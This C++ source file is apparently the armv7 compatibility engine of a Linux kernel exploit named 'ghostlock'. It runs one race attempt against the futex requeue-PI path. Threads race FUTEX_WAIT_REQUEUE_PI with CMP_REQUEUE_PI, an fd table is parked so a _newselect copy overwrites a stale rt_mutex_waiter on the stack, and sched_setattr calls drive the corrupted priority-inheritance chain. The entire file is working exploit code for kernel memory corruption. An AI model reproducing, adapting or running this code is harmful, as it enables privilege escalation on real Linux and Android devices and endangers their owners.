/*
 * The compat carrier's run mode (AArch32 helper).
 *
 * One invocation = one attempt. The fd table is parked on a never-ready
 * descriptor before the threads start, so the waiter thread's only syscall
 * between its `FUTEX_WAIT_REQUEUE_PI` return and the walk is `_newselect`
 * itself -- the copy that must overwrite the stale rt_mutex_waiter strip. The
 * main thread drives CMP_REQUEUE_PI and the deadline; the consumer rotates
 * sched_setattr on the waiter's tid; the waiter drains and disarms its own
 * pi_blocked_on, then reports.
 *
 * This file is compiled for armv7 only. It deliberately depends on nothing
 * from the native's session/profile/attack layers.
 */

#include "compat/carrier_engine.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <atomic>
#include <cstdio>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex_time64
#define __NR_futex_time64 422
#endif
#ifndef __NR__newselect
#define __NR__newselect 142
#endif
#ifndef __NR_timerfd_create
#define __NR_timerfd_create 353
#endif
#ifndef __NR_sched_setattr
#define __NR_sched_setattr 380
#endif

namespace {
    using ghostlock::compat::CarrierCommand;
    using ghostlock::compat::CarrierFutexAbi;
    using ghostlock::compat::CarrierResult;

    int g_log_fd = 1;

    constexpr int kRouteOk = 0;
    constexpr int kRouteRetryable = 1;
    constexpr int kRouteDirty = 3;
    constexpr int32_t kDrainMs = 1000;
    constexpr int32_t kFdCount = 320;
    constexpr int32_t kSetBytes = 0x28;
    constexpr int32_t kBackupBase = 384;
    constexpr int32_t kNeverReadyHigh = 700;
    constexpr int32_t kMaxBackups = 322;

    struct SchedAttr final {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    };

    struct FutexTs32 final {
        int32_t sec;
        int32_t nsec;
    };
    struct FutexTs64 final {
        int64_t sec;
        int64_t nsec;
    };
    union FutexTimeout final {
        FutexTs32 t32;
        FutexTs64 t64;
    };

    struct FdPlan final {
        struct Entry final {
            int32_t fd;
            int32_t backup;
        };
        Entry entries[kMaxBackups];
        int32_t count = 0;
        int32_t never_ready = -1;
    };

    struct Engine final {
        const CarrierCommand *cmd = nullptr;
        std::atomic<int> waiter_ready{0};
        std::atomic<int> owner_started{0};
        std::atomic<int> waiter_waiting{0};
        std::atomic<int> owner_chain_done{0};
        std::atomic<int> owner_stop{0};
        std::atomic<int> consumer_go{0};
        std::atomic<int> consumer_stop{0};
        std::atomic<int> consumer_calls{0};
        std::atomic<int> consumer_success{0};
        std::atomic<int> consumer_inflight{0};
        std::atomic<int> route_done{0};
        std::atomic<int> waiter_tid{0};
        uint32_t wait_futex = 0;
        uint32_t target_futex = 0;
        uint32_t chain_futex = 0;
        int32_t select_result = 0;
        int32_t select_errno = 0;
        int32_t drain_ms = 0;
        int32_t step = 0;
        int32_t error_number = 0;
    };

    void log_line(const char *message) noexcept {
        const size_t length = strlen(message);
        (void) !write(g_log_fd, message, length);
        (void) !write(g_log_fd, "\n", 1);
    }

    void log_value(const char *label, long value) noexcept {
        char buffer[96];
        const int written = snprintf(buffer, sizeof(buffer), "%s %ld", label, value);
        if (written > 0) {
            (void) !write(g_log_fd, buffer, static_cast<size_t>(written));
            (void) !write(g_log_fd, "\n", 1);
        }
    }

    int64_t now_ms() noexcept {
        struct timespec ts {};
        (void) clock_gettime(CLOCK_MONOTONIC, &ts);
        return static_cast<int64_t>(ts.tv_sec) * 1000 +
               static_cast<int64_t>(ts.tv_nsec) / 1000000;
    }

    void relax() noexcept {
        __asm__ volatile("yield" ::: "memory");
    }

    void sleep_poll(const CarrierCommand &command) noexcept {
        const uint32_t usec = command.state_poll_us != 0 ? command.state_poll_us : 1000;
        struct timespec ts {};
        ts.tv_sec = static_cast<time_t>(usec / 1000000U);
        ts.tv_nsec = static_cast<long>(usec % 1000000U) * 1000L;
        (void) nanosleep(&ts, nullptr);
    }

    void sleep_us(uint32_t usec) noexcept {
        struct timespec ts {};
        ts.tv_sec = static_cast<time_t>(usec / 1000000U);
        ts.tv_nsec = static_cast<long>(usec % 1000000U) * 1000L;
        (void) nanosleep(&ts, nullptr);
    }

    bool time64_abi(const CarrierCommand &command) noexcept {
        return command.futex_abi == static_cast<uint32_t>(CarrierFutexAbi::Time64);
    }

    long futex_op(const CarrierCommand &command, uint32_t *uaddr, int32_t op,
                  uint32_t val, const void *timeout, uint32_t *uaddr2,
                  uint32_t val3) noexcept {
        if (time64_abi(command)) {
            return syscall(__NR_futex_time64, uaddr, op, val, timeout, uaddr2, val3);
        }
        return syscall(__NR_futex, uaddr, op, val, timeout, uaddr2, val3);
    }

    /* FUTEX_WAIT and FUTEX_LOCK_PI take an **absolute** CLOCK_MONOTONIC
     * timeout. The native's waiter_thread computes now + route_wait_ms; a
     * "relative" value here is already in the past and the wait returns
     * immediately -- which is exactly what the first QEMU engine run did. */
    const void *absolute_timeout(const CarrierCommand &command, uint32_t ms,
                                 FutexTimeout *storage) noexcept {
        struct timespec now {};
        (void) clock_gettime(CLOCK_MONOTONIC, &now);
        int64_t sec = static_cast<int64_t>(now.tv_sec) + static_cast<int64_t>(ms / 1000U);
        int64_t nsec = static_cast<int64_t>(now.tv_nsec) +
                       static_cast<int64_t>(ms % 1000U) * 1000000LL;
        if (nsec >= 1000000000LL) { sec++; nsec -= 1000000000LL; }
        if (time64_abi(command)) {
            storage->t64.sec = sec;
            storage->t64.nsec = nsec;
            return &storage->t64;
        }
        storage->t32.sec = static_cast<int32_t>(sec);
        storage->t32.nsec = static_cast<int32_t>(nsec);
        return &storage->t32;
    }

    /* A relative timeout for FUTEX_WAIT / FUTEX_LOCK_PI's blocking path. */
    const void *relative_timeout(const CarrierCommand &command, uint32_t ms,
                                 FutexTimeout *storage) noexcept {
        if (time64_abi(command)) {
            storage->t64.sec = static_cast<int64_t>(ms / 1000U);
            storage->t64.nsec = static_cast<int64_t>(ms % 1000U) * 1000000LL;
            return &storage->t64;
        }
        storage->t32.sec = static_cast<int32_t>(ms / 1000U);
        storage->t32.nsec = static_cast<int32_t>(ms % 1000U) * 1000000;
        return &storage->t32;
    }

    /* The native's ghost_disarm shape: an already-expired absolute timeout on
     * FUTEX_LOCK_PI forces the blocking path, whose ETIMEDOUT clears this
     * thread's pi_blocked_on. */
    const void *expired_timeout(const CarrierCommand &command,
                                FutexTimeout *storage) noexcept {
        if (time64_abi(command)) {
            storage->t64.sec = 0;
            storage->t64.nsec = 0;
            return &storage->t64;
        }
        storage->t32.sec = 0;
        storage->t32.nsec = 0;
        return &storage->t32;
    }

    void pin_cpu(uint32_t cpu) noexcept {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(static_cast<int>(cpu), &set);
        (void) sched_setaffinity(0, sizeof(set), &set);
    }

    int32_t open_never_ready() noexcept {
        const long tfd = syscall(__NR_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC);
        if (tfd >= 0) {
            const int32_t high = fcntl(static_cast<int32_t>(tfd), F_DUPFD_CLOEXEC, kNeverReadyHigh);
            (void) close(static_cast<int32_t>(tfd));
            return high;
        }
        int32_t pipe_fds[2] = {-1, -1};
        if (pipe(pipe_fds) != 0) return -1;
        const int32_t high = fcntl(pipe_fds[0], F_DUPFD_CLOEXEC, kNeverReadyHigh);
        (void) close(pipe_fds[0]);
        (void) close(pipe_fds[1]);
        return high;
    }

    /* Back up every open fd the route may touch, then park all of them on the
     * never-ready descriptor. fd 319 is included unconditionally so the fd
     * table grows past nfds without needing a bit in the bitmap. */
    int32_t setup_fds(FdPlan *plan) noexcept {
        plan->never_ready = open_never_ready();
        if (plan->never_ready < 0) return -1;
        for (int32_t fd = 0; fd < kFdCount; fd++) {
            const int32_t flags = fcntl(fd, F_GETFD);
            if (flags < 0) continue;
            if (plan->count >= kMaxBackups) return -2;
            const int32_t backup = fcntl(fd, F_DUPFD_CLOEXEC, kBackupBase);
            if (backup < 0) return -1;
            plan->entries[plan->count].fd = fd;
            plan->entries[plan->count].backup = backup;
            plan->count++;
        }
        for (int32_t fd = 0; fd < kFdCount; fd++) {
            if (dup2(plan->never_ready, fd) < 0) return -1;
        }
        return 0;
    }

    bool restore_fds(FdPlan *plan) noexcept {
        bool ok = true;
        for (int32_t i = plan->count - 1; i >= 0; i--) {
            const FdPlan::Entry &entry = plan->entries[i];
            if (dup2(entry.backup, entry.fd) < 0) ok = false;
            (void) close(entry.backup);
        }
        plan->count = 0;
        if (plan->never_ready >= 0) {
            (void) close(plan->never_ready);
            plan->never_ready = -1;
        }
        return ok;
    }

    int32_t wait_consumer_idle(Engine *engine, int32_t deadline_ms) noexcept {
        engine->consumer_go.store(0);
        const int64_t started = now_ms();
        for (;;) {
            if (engine->consumer_inflight.load() == 0) {
                return static_cast<int32_t>(now_ms() - started);
            }
            if (now_ms() - started >= deadline_ms) return -1;
            relax();
        }
    }

    void *waiter_main(void *arg) {
        auto *engine = static_cast<Engine *>(arg);
        const CarrierCommand &command = *engine->cmd;
        pin_cpu(command.waiter_cpu);
        engine->waiter_tid.store(static_cast<int32_t>(syscall(__NR_gettid)));
        log_line("compat-engine: waiter start");
        if (futex_op(command, &engine->chain_futex, FUTEX_LOCK_PI, 0, nullptr,
                     nullptr, 0) != 0) {
            engine->error_number = errno;
        }
        engine->waiter_ready.store(1);
        while (!engine->owner_started.load() && !engine->owner_stop.load()) {
            sleep_poll(command);
        }
        if (engine->owner_stop.load()) {
            (void) futex_op(command, &engine->chain_futex, FUTEX_UNLOCK_PI, 0,
                            nullptr, nullptr, 0);
            return nullptr;
        }
        FutexTimeout timeout {};
        const void *wait_timeout =
            absolute_timeout(command, command.route_wait_ms, &timeout);
        engine->waiter_waiting.store(1);
        log_line("compat-engine: waiter parked");
        errno = 0;
        const long wait_ret = futex_op(command, &engine->wait_futex,
                                       FUTEX_WAIT_REQUEUE_PI, 0, wait_timeout,
                                       &engine->target_futex, 0);
        log_value("compat-engine: waiter futex ret", wait_ret);
        log_value("compat-engine: waiter futex errno", errno);
        log_line("compat-engine: waiter woke; entering _newselect");
        engine->consumer_go.store(1);
        struct timeval tv {};
        tv.tv_sec = static_cast<time_t>(command.select_timeout_us / 1000000U);
        tv.tv_usec = static_cast<suseconds_t>(command.select_timeout_us % 1000000U);
        errno = 0;
        const long selected = syscall(
            __NR__newselect, static_cast<int>(command.nfds),
            const_cast<uint8_t *>(command.bitmap),
            const_cast<uint8_t *>(command.bitmap) + kSetBytes,
            const_cast<uint8_t *>(command.bitmap) + 2 * kSetBytes, &tv);
        engine->select_result = static_cast<int32_t>(selected);
        engine->select_errno = errno;
        log_value("compat-engine: _newselect ret", selected);
        engine->drain_ms = wait_consumer_idle(engine, kDrainMs);
        log_value("compat-engine: drain ms", engine->drain_ms);
        FutexTimeout expired {};
        const uint32_t dummy = 0x80000000U | static_cast<uint32_t>(getpid());
        uint32_t dummy_word = dummy;
        (void) futex_op(command, &dummy_word, FUTEX_LOCK_PI, 0,
                        expired_timeout(command, &expired), nullptr, 0);
        engine->route_done.store(1);
        (void) futex_op(command, &engine->chain_futex, FUTEX_UNLOCK_PI, 0,
                        nullptr, nullptr, 0);
        while (!engine->owner_chain_done.load() && !engine->owner_stop.load()) {
            sleep_poll(command);
        }
        return nullptr;
    }

    void *owner_main(void *arg) {
        auto *engine = static_cast<Engine *>(arg);
        const CarrierCommand &command = *engine->cmd;
        errno = 0;
        const long locked = futex_op(command, &engine->target_futex,
                                     FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        log_value("compat-engine: owner target lock ret", locked);
        if (locked != 0) {
            log_value("compat-engine: owner target lock errno", errno);
        }
        while (!engine->waiter_ready.load() && !engine->owner_stop.load()) {
            sleep_poll(command);
        }
        if (engine->owner_stop.load()) {
            if (locked == 0) {
                (void) futex_op(command, &engine->target_futex,
                                FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            }
            return nullptr;
        }
        engine->owner_started.store(1);
        (void) futex_op(command, &engine->chain_futex, FUTEX_LOCK_PI, 0,
                        nullptr, nullptr, 0);
        engine->owner_chain_done.store(1);
        while (!engine->owner_stop.load()) sleep_poll(command);
        if (locked == 0) {
            (void) futex_op(command, &engine->target_futex, FUTEX_UNLOCK_PI, 0,
                            nullptr, nullptr, 0);
        }
        return nullptr;
    }

    void *consumer_main(void *arg) {
        auto *engine = static_cast<Engine *>(arg);
        const CarrierCommand &command = *engine->cmd;
        pin_cpu(command.consumer_cpu);
        int32_t seen = 0;
        while (!engine->consumer_stop.load()) {
            const int32_t sequence = engine->consumer_go.load();
            if (sequence == 0 || sequence == seen) {
                relax();
                continue;
            }
            seen = sequence;
            int32_t calls_this_sequence = 0;
            while (!engine->consumer_stop.load() &&
                   engine->consumer_go.load() == sequence) {
                if (command.delay_us != 0) sleep_us(command.delay_us);
                for (uint32_t burst = 0;
                     burst < command.consumer_burst_calls; burst++) {
                    if (engine->consumer_stop.load() ||
                        engine->consumer_go.load() != sequence) {
                        break;
                    }
                    engine->consumer_calls.fetch_add(1);
                    engine->consumer_inflight.store(1);
                    SchedAttr attr {};
                    attr.size = sizeof(attr);
                    attr.sched_policy = 3; /* SCHED_BATCH */
                    attr.sched_nice = (calls_this_sequence % 19) + 1;
                    errno = 0;
                    long ret = syscall(__NR_sched_setattr,
                                       engine->waiter_tid.load(), &attr, 0);
                    if (ret != 0 && !engine->consumer_stop.load() &&
                        engine->consumer_go.load() == sequence) {
                        FutexTimeout fallback {};
                        const void *fallback_timeout =
                            relative_timeout(command, 50, &fallback);
                        const long fret = futex_op(
                            command, &engine->target_futex, FUTEX_LOCK_PI, 0,
                            fallback_timeout, nullptr, 0);
                        if (fret == 0) {
                            (void) futex_op(command, &engine->target_futex,
                                            FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            ret = 0;
                        }
                    }
                    if (ret == 0) engine->consumer_success.fetch_add(1);
                    engine->consumer_inflight.store(0);
                    calls_this_sequence++;
                    if (static_cast<uint32_t>(calls_this_sequence) >=
                        command.consumer_max_calls) {
                        engine->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }
} // namespace

namespace ghostlock::compat {
    void set_log_fd(int fd) {
        if (fd >= 0) g_log_fd = fd;
    }

    void run_carrier_attempt(const CarrierCommand &command, CarrierResult *result) {
        Engine engine;
        engine.cmd = &command;
        result->status = static_cast<uint32_t>(kRouteRetryable);

        FdPlan plan;
        const int32_t fd_setup = setup_fds(&plan);
        if (fd_setup != 0) {
            result->status = static_cast<uint32_t>(kRouteDirty);
            result->step = 40;
            result->error_number = fd_setup;
            result->kernel_disarmed = 0;
            log_line("compat-engine: fd setup failed");
            return;
        }
        log_line("compat-engine: fds parked; starting race");

        pthread_t waiter_thread {};
        pthread_t owner_thread {};
        pthread_t consumer_thread {};
        int32_t thread_error = pthread_create(&consumer_thread, nullptr, consumer_main, &engine);
        if (thread_error == 0) {
            thread_error = pthread_create(&owner_thread, nullptr, owner_main, &engine);
        }
        if (thread_error == 0) {
            thread_error = pthread_create(&waiter_thread, nullptr, waiter_main, &engine);
        }
        if (thread_error != 0) {
            result->status = static_cast<uint32_t>(kRouteDirty);
            result->step = 41;
            result->error_number = thread_error;
            engine.consumer_stop.store(1);
            engine.owner_stop.store(1);
            (void) restore_fds(&plan);
            log_line("compat-engine: thread create failed");
            return;
        }

        const int64_t deadline = now_ms() + static_cast<int64_t>(command.route_done_timeout_ms);
        bool dirty = false;
        while (!engine.waiter_waiting.load() || !engine.owner_started.load()) {
            if (now_ms() >= deadline) {
                dirty = true;
                break;
            }
            sleep_poll(command);
        }
        if (!dirty) {
            if (command.setup_settle_us != 0) sleep_us(command.setup_settle_us);
            log_value("compat-engine: wait word at CMP",
                      static_cast<long>(engine.wait_futex));
            log_value("compat-engine: target word at CMP",
                      static_cast<long>(engine.target_futex));
            errno = 0;
            const long requeued = futex_op(command, &engine.wait_futex,
                                           FUTEX_CMP_REQUEUE_PI, 1,
                                           reinterpret_cast<const void *>(1),
                                           &engine.target_futex, 0);
            log_value("compat-engine: CMP_REQUEUE_PI ret", requeued);
            log_value("compat-engine: CMP_REQUEUE_PI errno", errno);
            while (!engine.route_done.load() && now_ms() < deadline) {
                sleep_poll(command);
            }
            if (!engine.route_done.load()) dirty = true;
        }

        engine.consumer_go.store(0);
        engine.consumer_stop.store(1);
        engine.owner_stop.store(1);
        if (!dirty) {
            (void) pthread_join(waiter_thread, nullptr);
            (void) pthread_join(owner_thread, nullptr);
            (void) pthread_join(consumer_thread, nullptr);
        }

        bool restored = false;
        if (!dirty) {
            restored = restore_fds(&plan);
        } else {
            /* A walk may still be in flight: leave the parked fds, as the
             * native's dirty stop does. */
            plan.count = 0;
            if (plan.never_ready >= 0) {
                (void) close(plan.never_ready);
                plan.never_ready = -1;
            }
        }

        const int32_t calls = engine.consumer_calls.load();
        const int32_t successes = engine.consumer_success.load();
        result->select_result = engine.select_result;
        result->select_errno = engine.select_errno;
        result->calls = calls;
        result->successes = successes;
        result->drain_ms = engine.drain_ms;
        result->userspace_clean = (!dirty && restored) ? 1U : 0U;
        result->kernel_disarmed = (!dirty && engine.drain_ms >= 0) ? 1U : 0U;
        if (dirty || engine.drain_ms < 0) {
            result->status = static_cast<uint32_t>(kRouteDirty);
            result->step = dirty ? 42 : 38;
        } else if (calls > 0 && successes > 0) {
            result->status = static_cast<uint32_t>(kRouteOk);
            result->step = 0;
        } else {
            result->status = static_cast<uint32_t>(kRouteRetryable);
            result->step = 33;
            result->error_number = engine.select_errno;
        }
        log_value("compat-engine: status", static_cast<long>(result->status));
        log_value("compat-engine: calls", calls);
        log_value("compat-engine: successes", successes);
    }
} // namespace ghostlock::compat
